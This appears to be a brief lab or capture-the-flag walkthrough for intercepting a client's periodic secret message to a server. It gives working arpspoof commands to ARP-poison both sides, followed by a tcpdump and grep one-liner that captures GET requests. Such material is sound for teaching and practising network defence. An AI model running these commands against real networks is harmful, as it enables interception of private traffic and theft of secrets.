# Victim description

-   `Client` will send to `server` periodically a secret message. Our job is to capture what is that secret

# Set up MITM attack: With ARP poisoining

-   Step 1:
    -   poison client side: `arpspoof -i eth0 -t (server_ip address) (client_ip address)`
-   Step 2:
    -   poison server side: `arpspoof -i eth0 -t (client_ip address) (server_ip address)`
-   Step 3:
    -   packet sniffing in the middle with `tcpdump`
    -   Capture GET requests: `tcpdump -Alvvs0 | grep 'GET'`
